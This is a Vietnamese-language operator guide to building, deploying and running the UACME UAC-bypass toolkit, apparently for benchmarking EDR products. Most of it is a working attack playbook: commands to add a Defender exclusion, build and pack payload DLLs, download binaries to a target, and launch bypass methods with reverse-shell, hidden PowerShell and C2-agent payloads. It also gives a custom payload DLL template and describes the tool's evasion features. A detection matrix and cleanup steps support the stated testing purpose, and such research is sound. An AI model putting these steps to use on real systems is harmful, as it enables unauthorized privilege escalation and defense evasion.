# UACME — Setup & Usage Guide

> **Mục tiêu:** Demo T1548.002 (Bypass User Account Control) từ **Admin → High Integrity Elevated Admin**, benchmark EDR detection.
> **Base:** [hfiref0x/UACME](https://github.com/hfiref0x/UACME) v3.71
> **Ngày build:** 2026-08-05

---

## 1. Kiến trúc tổng quan

```
┌─────────────────────────────────────────────────────────────┐
│ MÁY DEV (Build)                                             │
│  - Visual Studio 2022 + v143 toolset                        │
│  - Compile Akagi + Fubuki + Akatsuki                        │
│  - Generate .cd payloads via Naka64.exe                     │
│  - Copy binary + payloads lên target                        │
└─────────────────────────────────────────────────────────────┘
                           │ T1105 (Ingress Tool Transfer)
                           ▼
┌─────────────────────────────────────────────────────────────┐
│ MÁY TARGET (Lab — Windows 7/8.1/10/11/Server)              │
│  - User: Admin account with UAC enabled                     │
│  - UAC level: Default (Notify when apps try to make changes)│
│  - EDR: installed & running (để benchmark)                  │
│                                                             │
│  Exploit flow (generic DLL hijack method):                  │
│  1. Admin user chạy Akagi64.exe [method] [payload]          │
│  2. Binary masquerade process → explorer.exe                │
│  3. Copy proxy DLL vào System32 (via IFileOperation)        │
│  4. Trigger auto-elevated exe (pkgmgr.exe, mmc.exe, ...)    │
│  5. Auto-elevated process load proxy DLL                    │
│  6. Proxy DLL spawn payload với High Integrity              │
└─────────────────────────────────────────────────────────────┘
```

### Project structure (post-build)

```
UACME/
├── SETUP_GUIDE.md                  # ⭐ File này
├── Built/                          # ⭐ Artifacts đã build sẵn
│   ├── Naka64.exe                  # Packer tool (92 KB)
│   ├── Fubuki64.dll                # Proxy DLL payload (35 KB)
│   ├── Akatsuki64.dll              # Wow64Logger payload (12 KB)
│   ├── Fubuki64.cd                 # Compressed Fubuki (14 KB)
│   ├── Akatsuki64.cd               # Compressed Akatsuki (5 KB)
│   └── secrets64.bin               # Encryption keys (72 bytes)
├── UACME/                          # Source repo
│   ├── Source/uacme.sln            # VS Solution
│   ├── Source/Akagi/               # Main project
│   │   ├── uacme.vcxproj
│   │   ├── bin/                    # .cd + .bin payload files
│   │   ├── methods/                # 30+ method implementations
│   │   └── output/x64/Release/     # Build output (có thể bị AV xóa)
│   ├── Source/Fubuki/              # Proxy DLL project
│   ├── Source/Akatsuki/            # Wow64Logger DLL project
│   ├── Source/Naka/                # Packer tool project
│   └── Source/Shared/              # Mini-CRT + shared headers
└── Akagi64.exe                     # (cần build từ source)
```

---

## 2. Tổng quan Methods

### 2.1 Active Methods (unfixed — hoạt động trên Win11 mới nhất)

| # | Method | Type | Target | AlwaysNotify | Win Support |
|---|---|---|---|---|---|
| 23 | DismCore.dll Hijack | DLL Hijack | pkgmgr.exe | No | 7→11 24H2 |
| 32 | UiAccess + DLL | UIPI Bypass | osk.exe, EventVwr | No | 7→11 |
| 33 | Registry (fodhelper) | Registry | fodhelper.exe | No | 10 TH1+ |
| **34** | **Disk Cleanup Env Var** | Env Variable | schtasks/svchost | **Yes** | 8.1+ |
| 38 | AppInfo CmdLine Spoof | COM | mmc.exe | No | 7+ |
| 39 | .NET CorProfiler | DLL Hijack | mmc.exe | No | 7+ |
| **41** | **ICMLuaUtil ShellExec** | COM | Any | No | 7+ |
| 43 | DccwCOM | COM | dccw.exe | No | 7+ |
| 53 | Registry (sdclt) | Registry | sdclt.exe | No | 10 RS1+ |
| **59** | **DebugObject** | AppInfo RPC | Any | No | 7+ |
| 61 | Registry (slui/changepk) | Registry | slui.exe | No | 10 RS1+ |
| 62 | Registry (computerdefaults) | Registry | computerdefaults.exe | No | 10 RS4+ |
| 63/71 | NIC Poison v1/v2 | DLL Hijack | Native Image Cache | No | 7+ |
| 64 | IE Add-on Install | COM | IE cache | No | 7+ |
| 67 | ms-settings Protocol | Protocol Hijack | fodhelper.exe | No | 10 TH1+ |
| 68 | ms-windows-store Protocol | Protocol Hijack | wsreset.exe | No | 10 RS5+ |
| 70 | CurVer Registry | Registry | fodhelper/computerdefaults | No | 10 TH1+ |
| 72 | MSDT DLL Search | DLL Hijack | msdt.exe | No | 10 TH1+ |
| 74 | IElevatedFactoryServer | COM | Task Scheduler | No | 8.1+ |
| 75 | IDiagnosticProfile | COM | Task Scheduler | No | 7+ |
| 76 | iscsicpl.exe Search | DLL Hijack | iscsicpl.exe | No | 7+ |
| 77 | atl.dll MMC Hijack | DLL Hijack | mmc.exe | No | 7+ |
| 80 | RequestTrace | Env Var | taskhostw.exe | **Yes** | 11 24H2 |
| **81** | **QuickAssist** | Env Var + UIPI | QuickAssist.exe | **Yes** | 10 20H1+ |
| 82 | CleanMgr Admin | Shell API | SystemSettingsAdminFlows | No | 10 20H1+ |
| **83** | **UnifiedConsent** | Env Var + DLL | taskhostw.exe | **Yes** | 10 20H1+ |
| **84** | **TabTip** | Env Var + UIPI | TabTip.exe | **Yes** | 8.1+ |
| 85 | Narrator | Protocol + UIPI | Narrator.exe | **Yes** | 10 RS5+ |

> **Bold** = Recommended first picks for EDR benchmark

### 2.2 Phân loại theo technique

| Technique | MITRE ID | Methods |
|---|---|---|
| DLL Hijack (IFileOperation) | T1574.001 | 23, 39, 52, 63, 71, 72, 76, 77 |
| Elevated COM Interface | T1548.002 | 41, 43, 74, 75 |
| Registry Key Manipulation | T1112 | 33, 53, 61, 62, 67, 68, 70 |
| Environment Variable Expansion | T1574.007 | 34, 69, 80, 81, 83, 84 |
| AppInfo ALPC / RPC | T1548.002 | 38, 59 |
| GUI Hack / UIPI Bypass | T1548.002 | 32, 55, 79, 81, 84, 85 |
| Race Condition / Junction | T1574.006 | 36 |

---

## 3. Build từ Source

### Yêu cầu

| Component | Version |
|---|---|
| OS | Windows 10/11 x64 |
| Visual Studio | 2022 Community/Pro/Enterprise (v143) hoặc 2026 (v145) |
| Workload | "Desktop development with C++" |
| Windows SDK | 10.0+ |

### ⚠️ QUAN TRỌNG: AV Exclusion

**Windows Defender sẽ tự động xóa Akagi64.exe ngay khi build xong** do signature "HackTool:Win32/UACMe". Phải add exclusion trước khi build:

```powershell
# Mở PowerShell as Administrator:
Add-MpPreference -ExclusionPath "d:\2026\Benchmark_Q3\Prvention\UACME"
```

### Cách 1: Visual Studio IDE

```powershell
cd "d:\2026\Benchmark_Q3\Prvention\UACME\UACME\Source"
start uacme.sln

# Trong VS:
# - Chọn Configuration: Release, Platform: x64
# - Nếu dùng VS 2022: Project → Properties → General → Platform Toolset = v143
# - Build → Build Solution (Ctrl+Shift+B)
# - Output: Source\Akagi\output\x64\Release\Akagi64.exe
```

### Cách 2: MSBuild command-line

```powershell
$msbuild = "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"
$sln = "d:\2026\Benchmark_Q3\Prvention\UACME\UACME\Source\uacme.sln"

# Build toàn bộ solution (single-threaded để tránh lỗi đua file)
& $msbuild $sln /p:Configuration=Release /p:Platform=x64 /p:PlatformToolset=v143 /t:Build /v:minimal /nologo /m:1
```

### Cách 3: Build từng project riêng (recommended)

```powershell
$msbuild = "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"
$src = "d:\2026\Benchmark_Q3\Prvention\UACME\UACME\Source"

# 1. Akagi (main tool) — Build từ solution context để resolve include paths
& $msbuild "$src\uacme.sln" /p:Configuration=Release /p:Platform=x64 /p:PlatformToolset=v143 /t:Akagi /v:minimal /nologo /m:1

# 2. Fubuki (proxy DLL payload)
& $msbuild "$src\Fubuki\dll.vcxproj" /p:Configuration=Release /p:Platform=x64 /p:PlatformToolset=v143 /p:SolutionDir="$src\" /t:Build /v:minimal /nologo

# 3. Akatsuki (wow64 logger payload)
& $msbuild "$src\Akatsuki\Akatsuki.vcxproj" /p:Configuration=Release /p:Platform=x64 /p:PlatformToolset=v143 /p:SolutionDir="$src\" /t:Build /v:minimal /nologo

# 4. Naka (packer tool)
& $msbuild "$src\Naka\Naka.vcxproj" /p:Configuration=Release /p:Platform=x64 /p:PlatformToolset=v143 /p:SolutionDir="$src\" /t:Build /v:minimal /nologo
```

### Compile flags (đã được set trong .vcxproj)

| Flag | Purpose |
|---|---|
| `/MT` | Static link CRT — binary độc lập, không dependency |
| `/O2` `/Os` | Tối ưu speed + minimize size |
| `/GS-` | **Tắt buffer security check** — giảm pattern |
| `/Gy` | Function-level linking — loại bỏ dead code |
| `/GL` | Whole Program Optimization (LTCG) |
| `/GS-` | No buffer security cookie |
| Control Flow Guard: **Off** | Giảm CFG-related artifacts |
| Spectre Mitigation: **Off** | Không thêm lfence/call-ret |

---

## 4. Tạo .cd Payload Files

Các file `.cd` là container mã hóa AES + nén Delta, chứa proxy DLL. Quy trình:

```
Fubuki64.dll ──► Naka64.exe ──► Fubuki64.cd + Fubuki64.key
Akatsuki64.dll ─► Naka64.exe ──► Akatsuki64.cd + Akatsuki64.key

Tất cả .key ──► Naka64.exe --stable ──► secrets64.bin
```

```powershell
# 1. Copy DLLs vào thư mục làm việc
$work = "C:\Temp\uacme_pack"
mkdir $work -Force
copy "Source\Fubuki\output\x64\Release\Fubuki64.dll" $work
copy "Source\Akatsuki\output\x64\Release\Akatsuki64.dll" $work

# 2. Pack từng DLL
cd $work
..\Source\Naka\output\x64\Release\Naka64.exe Fubuki64.dll
..\Source\Naka\output\x64\Release\Naka64.exe Akatsuki64.dll

# 3. Tạo secrets64.bin
..\Source\Naka\output\x64\Release\Naka64.exe --stable

# 4. Copy vào Akagi/bin/
copy Fubuki64.cd "..\Source\Akagi\bin\"
copy Akatsuki64.cd "..\Source\Akagi\bin\"
copy secrets64.bin "..\Source\Akagi\bin\"

# 5. Rebuild Akagi để embed resources
& $msbuild "$src\uacme.sln" /p:Configuration=Release /p:Platform=x64 /p:PlatformToolset=v143 /t:Akagi /v:minimal /nologo /m:1
```

> **Note:** Các file `.cd` và `secrets64.bin` đã được tạo sẵn trong `Built/` folder.

---

## 5. Deploy lên Target

### Bước 1: Chuẩn bị binary

```powershell
# Từ máy dev, copy binary + DLLs lên target:
# OPTION A: HTTP (nếu lab có web server)
Invoke-WebRequest -Uri "http://<lab-server>/Akagi64.exe" -OutFile "C:\Users\Public\Akagi64.exe"
Invoke-WebRequest -Uri "http://<lab-server>/Fubuki64.dll" -OutFile "C:\Users\Public\Fubuki64.dll"

# OPTION B: SMB copy
copy "\\<dev>\share\Akagi64.exe" "C:\Users\Public\"
copy "\\<dev>\share\Fubuki64.dll" "C:\Users\Public\"

# OPTION C: Air-gapped — USB
# Copy thủ công vào C:\Users\Public\
```

### Bước 2: Verify target environment

```powershell
# 1. Kiểm tra UAC status
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System | Select EnableLUA, ConsentPromptBehaviorAdmin

# Expected output:
#   EnableLUA = 1
#   ConsentPromptBehaviorAdmin = 5 (default) hoặc 2 (AlwaysNotify)

# 2. Kiểm tra user là admin
whoami /groups | findstr /C:"S-1-5-32-544" /C:"S-1-16-8192"
# Phải thấy: Mandatory Label\Medium Mandatory Level (NOT High)

# 3. Verify binary không bị AV xóa
dir C:\Users\Public\Akagi64.exe

# 4. Verify Windows build (để chọn method phù hợp)
[System.Environment]::OSVersion.Version
```

---

## 6. Usage — Thực thi UAC Bypass

### Cú pháp cơ bản

```powershell
Akagi64.exe [Method_Number] [Optional_Command]
```

### Examples

```powershell
# Method 41 (ICMLuaUtil) — Đơn giản nhất, phổ biến nhất
Akagi64.exe 41

# Method 41 + custom payload
Akagi64.exe 41 C:\Windows\System32\calc.exe

# Method 59 (DebugObject) — Mạnh nhất, hoạt động Win7→Win11
Akagi64.exe 59 C:\Windows\System32\cmd.exe

# Method 34 (Disk Cleanup) — AlwaysNotify compatible
Akagi64.exe 34

# Method 81 (QuickAssist) — Win10 20H1+, AlwaysNotify
Akagi64.exe 81 C:\Users\Public\payload.exe

# Reverse shell example
Akagi64.exe 41 "C:\Windows\System32\cmd.exe /c C:\Users\Public\reverse.bat"
```

### Verify escalation thành công

```powershell
# Nếu payload = cmd.exe (default):
# - Cửa sổ cmd mới mở ra với "Administrator: C:\Windows\System32\cmd.exe"
# - whoami → <computer>\<user> (vẫn là user gốc, nhưng elevated)

# Verify integrity level:
whoami /groups | findstr "Mandatory"
# Expected: Mandatory Label\High Mandatory Level (đã elevated)

# Check parent process:
tasklist /v | findstr cmd
# User Name column sẽ là user hiện tại, nhưng integrity = High
```

### Method Picks cho EDR Benchmark

| Priority | Method | Lý do |
|---|---|---|
| **P0** | #41 (ICMLuaUtil) | Phổ biến nhất, COM elevation, chưa fix |
| **P0** | #59 (DebugObject) | APPINFO RPC trực tiếp, không DLL drop |
| **P1** | #34 (Disk Cleanup) | AlwaysNotify compatible, svchost chain |
| **P1** | #81 (QuickAssist) | Signed MS binary, AlwaysNotify |
| **P1** | #83 (UnifiedConsent) | taskhostw chain, new technique |
| **P2** | #38 (Hakril) | AppInfo cmdline spoof — bypass validation |
| **P2** | #80 (RequestTrace) | Win11 24H2 specific |

### Methods yêu cầu embedded payload (.cd)

Các method sau cần Fubuki64.dll hoặc Akatsuki64.dll được embed trong resource (`.cd` files):

```
23 (DISM), 30 (Wow64Logger), 32 (UiAccess), 36 (WUSA Junction),
37 (SxS Dccw), 38 (Hakril), 39 (CorProfiler), 52 (DirectoryMock),
55/79 (TokenModUIAccess), 63/71 (NIC Poison), 64 (IE Add-on),
72 (MSDT), 74/75 (VFServer Task/Diag), 76 (iscsicpl),
77 (Atl Hijack), 80 (RequestTrace), 81 (QuickAssist),
82 (CleanMgr), 83 (UnifiedConsent), 84 (TabTip), 85 (Narrator)
```

Nếu `.cd` files chưa được embed, các method này sẽ fail với `STATUS_RESOURCE_TYPE_NOT_FOUND`.

**Methods KHÔNG cần payload** (hoạt động standalone):
```
33, 34, 41, 43, 53, 59, 61, 62, 67, 68, 70
```

---

## 7. EDR Benchmark — Detection Matrix

### Detection Points

| # | Detection Point | Event Source | Difficulty | Notes |
|---|---|---|---|---|
| 1 | **Static scan** — binary bị flag khi copy | AV/EDR file scanner | Easy | UACME = well-known HackTool |
| 2 | **Execution block** — binary bị chặn khi launch | EDR process hook | Medium | Process masquerade (explorer.exe) có thể help |
| 3 | **File write to System32** | Sysmon EID 11 / minifilter | Easy | DLL hijack methods ghi file vào System32 |
| 4 | **Registry key manipulation** | Sysmon EID 12/13/14 | Medium | HKCU\Software\Classes\ + shell\open\command |
| 5 | **COM object creation** (Elevation Moniker) | ETW COM Provider | Hard | CoGetObject với Elevation:Administrator!new: |
| 6 | **Environment variable modification** | ETW | Medium | %windir%, %cor_profiler%, etc. |
| 7 | **APPINFO RPC call** | ETW RPC Provider | Hard | RAiLaunchAdminProcess qua ALPC |
| 8 | **Process masquerade** (explorer.exe) | Sysmon EID 1 | Medium | Process rename trước execution |
| 9 | **DLL load from user path** | Sysmon EID 7 | Easy | Fubuki64.dll loaded by auto-elevated exe |
| 10 | **Process parent chain anomaly** | EDR process tree | Medium | svchost.exe → pkgmgr.exe → cmd.exe |
| 11 | **Elevated process without UAC prompt** | ETW / Security EID 4688 | Medium | Token elevation type = 1 (Limited→Full) |

### Benchmark Scorecard Template

| Detection Point | CrowdStrike | SentinelOne | Defender | Elastic | Carbon Black |
|---|---|---|---|---|---|
| Static scan | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No |
| Execution block | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No |
| System32 file write | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No |
| Registry manipulation | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No |
| COM elevation | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No |
| Process masquerade | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No |
| DLL load anomaly | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No |
| Parent chain | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No |
| Token elevation | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No | ☐ Yes ☐ No |

### Thu thập evidence

```powershell
# Sysmon logs
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 100 |
    Where-Object { $_.Id -in @(1,3,7,11,12,13,14) } |
    Format-Table TimeCreated, Id, Message -Wrap

# Windows Security Event Log
Get-WinEvent -LogName "Security" -MaxEvents 50 |
    Where-Object { $_.Id -in @(4688,4697,4670,4798) } |
    Format-Table TimeCreated, Id, Message -Wrap

# EDR-specific:
# CrowdStrike:   falconctl event_search --filter "event_simpleName:ProcessRollup2"
# SentinelOne:   SentinelCtl log events --type process_creation
# Defender:      Get-MpThreatDetection
# Elastic:       elastic-agent diagnostics collect
```

---

## 8. Cleanup

```powershell
# Kill spawned elevated processes
taskkill /F /IM cmd.exe 2>$null
taskkill /F /IM calc.exe 2>$null
taskkill /F /IM pkgmgr.exe 2>$null

# Xóa artifacts trên target
del C:\Users\Public\Akagi64.exe 2>$null
del C:\Users\Public\Fubuki64.dll 2>$null

# Xóa DLL dropped vào System32 (method-specific)
# - Method 23: del C:\Windows\System32\DismCore.dll
# - Method 39: del C:\Windows\System32\CorProfiler.dll
# - Method 76: del C:\Windows\System32\iscsiexe.dll
# - Method 77: del C:\Windows\System32\atl.dll

# Clean COM/Registry artifacts (nếu dùng Registry methods)
# Các key thường bị thay đổi:
# - HKCU\Software\Classes\ms-settings\shell\open\command
# - HKCU\Software\Classes\mscfile\shell\open\command
# - HKCU\Software\Classes\Folder\shell\open\command
# - HKCU\Environment (biến %windir% nếu bị set)
```

---

## 9. Troubleshooting

### Lỗi: "STATUS_ELEVATION_REQUIRED"

```
→ Bạn đang chạy từ elevated process (High Integrity).
→ UACME yêu cầu chạy từ Medium Integrity (standard admin, KHÔNG "Run as Administrator").
→ Mở cmd.exe bình thường (không elevate) và chạy Akagi64.exe từ đó.
```

### Lỗi: "STATUS_NOT_SUPPORTED"

```
→ Method không hỗ trợ trên Windows build này.
→ Kiểm tra bảng methods: mỗi method có build range riêng.
→ Dùng method #41 hoặc #59 — hoạt động trên mọi Windows build.
→ Hoặc build quá mới: method đã bị fix.
```

### Lỗi: "STATUS_INVALID_IMAGE_FORMAT" / "STATUS_RESOURCE_TYPE_NOT_FOUND"

```
→ Method cần embedded payload (.cd file) nhưng resource trống (size 0).
→ Cần rebuild với .cd files đã được pack đúng.
→ Hoặc dùng method không cần payload: #41, #59, #34.
```

### Lỗi: "STATUS_ACCESS_DENIED"

```
→ COM elevation failed — có thể do UAC level quá cao.
→ Thử chuyển UAC về default level.
→ Hoặc dùng method AlwaysNotify compatible: #34, #81, #83, #84.
```

### Binary bị AV xóa ngay khi copy

```
→ AV static detection. Cần add exclusion trước.
→ Hoặc delivery binary qua encrypted channel (HTTPS + password-protected zip).
→ Benchmark note: "AV static detection: PASS"
```

### Method chạy nhưng không spawn process

```
1. WER/Diag services có thể bị disabled → check services.msc
2. Payload path có khoảng trắng → wrap trong quotes
3. Anti-malware engine chặn child process creation
4. AppInfo service không chạy → sc start AppInfo
```

---

## 10. Tùy chỉnh Payload

### Thay đổi payload command line

```powershell
# Default payload (nếu không chỉ định): %systemroot%\system32\cmd.exe

# Custom payload lúc runtime:
Akagi64.exe 41 "C:\Users\Public\reverse_shell.exe 10.0.0.1 4444"

# PowerShell payload:
Akagi64.exe 41 "powershell.exe -WindowStyle Hidden -Command ..."

# C2 agent:
Akagi64.exe 59 "C:\Users\Public\agent.dll,Start"
```

### Tạo payload DLL riêng

Thay vì dùng Fubuki64.dll mặc định, có thể viết DLL payload riêng:

```c
// my_payload.c — Compile với /MT /GS- /LD
#include <Windows.h>

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        // Code chạy với High Integrity
        WinExec("cmd.exe", SW_SHOW);
        // HOẶC:
        // system("whoami > C:\\Users\\Public\\pwned.txt");
    }
    return TRUE;
}
```

Sau đó pack bằng Naka64.exe và embed vào Akagi.

---

## 11. Các Built-in Defense Evasion

UACME có các cơ chế evasion mặc định:

| # | Mechanism | File |
|---|---|---|
| 1 | **Anti-MpEngine Emulation** | `stub.c`, `windefend.c` |
| 2 | **Process Masquerade** → đổi tên thành explorer.exe | `main.c:360` |
| 3 | **Encoded function pointers** (EncodePointer API) | `sup.c` |
| 4 | **Compressed payloads** (LZNT1+AES trong resource) | `compress.c` |
| 5 | **No CRT** (tự implement toàn bộ string/memory) | `Shared/_strcpy.c`... |
| 6 | **Indirect SEH control flow** (divide-by-zero → SEH handler) | `stub.c` |
| 7 | **Random trusted exe selection** cho masquerade | `sup.c:supSelectRandomExecutable` |

### Độ detection của built-in evasion

| EDR Product | Static | Dynamic | Notes |
|---|---|---|---|
| Windows Defender | **Detected** | Partial | Nhận diện static signature |
| CrowdStrike Falcon | Medium | Medium | Machine learning model có thể flag |
| SentinelOne | Medium | Low | Behavioral AI focused |
| Elastic EDR | Low | Medium | DLL hijack pattern detection |
| Carbon Black | Medium | Medium | Reputation-based |

---

## 12. Tham khảo

- [UACME GitHub](https://github.com/hfiref0x/UACME) — Source repository
- [MITRE T1548.002](https://attack.mitre.org/techniques/T1548/002/) — Bypass User Account Control
- [Microsoft UAC Stance](https://devblogs.microsoft.com/oldnewthing/20160816-00/?p=94105) — Why UAC bypasses aren't fixed
- [CVE-2026-20817 PoC](../PE/CVE-2026-20817-hardened/SETUP_GUIDE.md) — T1068 LPE from Standard→SYSTEM

---

> **Disclaimer:** For educational and authorized security testing purposes only. Use only on systems you own or have explicit written permission to test.
